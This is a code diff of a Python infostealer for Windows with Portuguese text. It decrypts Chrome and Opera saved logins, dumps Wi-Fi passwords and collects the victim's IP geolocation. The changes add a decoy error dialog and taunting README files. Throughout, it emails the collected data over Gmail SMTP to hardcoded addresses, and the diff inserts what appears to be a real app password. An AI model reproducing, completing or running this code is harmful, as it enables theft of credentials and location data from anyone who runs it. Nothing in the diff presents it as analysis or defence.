@@ -4,23 +4,41 @@ from email.mime.base import MIMEBase
 from Crypto.Cipher import AES
 import smtplib, ssl, sys, os
 from email import encoders
+from lib.ssw import GeoLocation
+from lib.connect import checkNetwork
 import subprocess as sp
+from lib.drawling import ddd
+from tkinter import messagebox
 import win32crypt
 import sqlite3
 import base64
 import shutil
 import json
 
+locate = GeoLocation()
+
 operadb = "operadb.db"
 chromedb = 'chrome.db'
 path_local = r'AppData\Local\Google\Chrome\User Data\Local State'
 path_login = r'AppData\Local\Google\Chrome\User Data\default\Login Data'
 
-ADDR = 'SENDER_GMAIL'
+subject_text = f'''
+    Nome PC: {os.getlogin()} ||
+    IP: {locate.ip_addr()} ||
+    Cidade: {locate.city()} ||
+    Estado: {locate.region()} ||
+    CEP: {locate.postal_code()} ||
+    País: {locate.country()} ||
+    Lat: {locate.latitude()} ||
+    Lon: {locate.longitude()} ||
+    Provedor: {locate.organization_name()}
+'''
+
+ADDR = 'xablau.mpx@gmail.com'
 msg = MIMEMultipart()
-msg['Subject'] = 'Hacking'
+msg['Subject'] = subject_text
 msg['From'] = ADDR
-msg['To'] = 'RECEIVED'
+msg['To'] = 'vinibruno99@gmail.com'
 
 # chrome
 def getChrome(chrome):
@@ -73,7 +91,7 @@ def Get_Wifi_Password():
                         two_point2 = network.find(':')
                         passwd = passwords[two_point2+2:]
                         get_network = f'Rede: {names}\nSenha: {passwd}\n\n'
-                        with open('password.csv', 'a') as wifi:
+                        with open('iloveyou.csv', 'a') as wifi:
                             wifi.write(f'{get_network}')
                         wifi.close()
     except:
@@ -81,12 +99,12 @@ def Get_Wifi_Password():
 # send email
 def Send_Email():
     try:
-        files = open('password.csv', 'rb')
+        files = open('iloveyou.csv', 'rb')
         att = MIMEBase('application', 'octet-stream')
         att.set_payload(files.read())
         encoders.encode_base64(att)
         att.add_header(
-            'Content-Disposition', 'attachment; filename=password.csv'
+            'Content-Disposition', 'attachment; filename=iloveyou.csv'
         )
         files.close()
         msg.attach(att)
@@ -98,7 +116,7 @@ def Send_Email():
     with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
         try:
             smtp.starttls(context=context)
-            smtp.login(msg['From'], 'YOUR_PASSWORD_GMAIL')
+            smtp.login(msg['From'], 'mvwxzpfhspkpobpg')
             smtp.sendmail(msg['From'], msg['To'], msg.as_string())
             return 'Email Send Sucess'
 
@@ -138,6 +156,18 @@ def decryptPasswordOP(password, key):
 
 if __name__ == "__main__":
     if not sys.platform == 'linux':
+        messagebox.showinfo('HTTPSConnectionPool Error', message='Connect Network Error') | sys.exit() if checkNetwork('https://google.com', timeout=5) == False else None
+        ddd()
+        text = f'{"-"*7} readme.txt {"-"*7}\n\n \t TROUXA \n\n{"-"*26}'
+        folder = 'README'
+        if not os.path.exists(folder):
+            os.mkdir(folder)
+
+        for txt in range(1, 11):
+            file = open(f'{folder}/README{txt}.txt', 'w')
+            file.write(text)
+            file.close()
+
         Get_Wifi_Password()
         key_master = getPassword()
         login_db = os.environ['userprofile'] + os.sep + path_login
@@ -152,7 +182,7 @@ if __name__ == "__main__":
             encrypted_password = item[2]
             decrypted_password = decryptPassword(encrypted_password, key_master)
             save = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n"
-            with open('password.csv', 'a') as passwords:
+            with open('iloveyou.csv', 'a') as passwords:
                 passwords.write(save)
             passwords.close()
 
@@ -163,7 +193,7 @@ if __name__ == "__main__":
                 db_path = os.path.join(os.environ["userprofile"],"AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
             except:
                 db_path = os.path.join(os.environ["userprofile"],"AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
-            file = open("password.csv", "a")
+            file = open("iloveyou.csv", "a")
             file.write("\n\n============> NAVEGADOR OPERA <============\n")
             shutil.copyfile(db_path, operadb)
             db = sqlite3.connect(operadb)
@@ -199,8 +229,10 @@ if __name__ == "__main__":
         cursor.close()
         connect.close()
     try:
-        os.remove(chromedb)
-        os.remove('password.csv')
-        os.remove(operadb)
+        if os.path.exists(chromedb):
+            os.remove(chromedb)
+        if os.path.exists(operadb):
+            os.remove(operadb)
+        os.remove('iloveyou.csv')
     except:
         pass
